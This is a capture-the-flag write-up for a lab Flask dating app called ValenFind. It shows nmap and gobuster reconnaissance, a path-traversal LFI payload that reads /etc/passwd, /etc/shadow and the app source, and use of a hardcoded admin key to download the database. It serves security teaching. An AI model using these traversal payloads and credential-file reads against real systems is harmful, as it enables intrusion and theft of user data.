# ValenFind CTF - Writeup

## Challenge Overview
- **Target**: ValenFind Dating Application
- **IP**: 10.81.152.95
- **Ports**: 22 (SSH), 5000 (Flask Web App)

## Reconnaissance

### Initial Nmap Scan
```bash
sudo nmap -sV -A -T4 -p- 10.81.152.95
```

**Key Findings**:
- Port 5000: Flask app (Werkzeug/3.0.1, Python/3.12.3)
- Application: "ValenFind - Secure Dating"

### Directory Enumeration
```bash
gobuster dir -u http://10.81.152.95:5000/ -w /usr/share/wordlists/dirb/big.txt
```

**Discovered Endpoints**:
- `/login`, `/register` - Authentication
- `/dashboard`, `/my_profile` - Protected routes

## Vulnerability Discovery

### Finding the LFI
Registered an account and explored the application. Found JavaScript code in a profile page:

```javascript
function loadTheme(layoutName) {
    fetch(`/api/fetch_layout?layout=${layoutName}`)
        .then(r => r.text())
        .then(html => { /* ... */ });
}
```

**Vulnerable Endpoint**: `/api/fetch_layout?layout=`

### Testing LFI
```bash
curl "http://10.81.152.95:5000/api/fetch_layout?layout=../../../../etc/passwd"
```

Error revealed base path: `/opt/Valenfind/templates/components/`

## Exploitation

### Step 1: Enumerate System Files
Created automated enumeration script to extract:
- `/etc/passwd` - System users
- `/etc/shadow` - Password hashes
- `/proc/self/environ` - Process environment
- `/proc/self/cmdline` - Process command line
- Various log files

### Step 2: Extract Application Source Code
```bash
curl "http://10.81.152.95:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py"
```

**Critical Finding in Source Code**:
```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"

@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        return send_file(DATABASE, as_attachment=True)
```

### Step 3: Access Admin API
```bash
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
     "http://10.81.152.95:5000/api/admin/export_db" \
     -o cupid.db
```

### Step 4: Extract Flag from Database
```bash
sqlite3 cupid.db ".dump"
sqlite3 cupid.db "SELECT * FROM users;"
```

## Attack Chain Summary

1. **Reconnaissance** → Identified Flask application on port 5000
2. **Discovery** → Found LFI vulnerability in `/api/fetch_layout` endpoint
3. **Enumeration** → Used LFI to read system files and application source code
4. **Exploitation** → Discovered hardcoded admin API key in source code
5. **Flag Retrieval** → Used admin API to download database containing flag

## Key Vulnerabilities

1. **Local File Inclusion (LFI)** - No path sanitization in `/api/fetch_layout`
2. **Hardcoded Credentials** - Admin API key in source code
3. **Information Disclosure** - Source code accessible via LFI
4. **Weak Access Control** - Simple header-based authentication
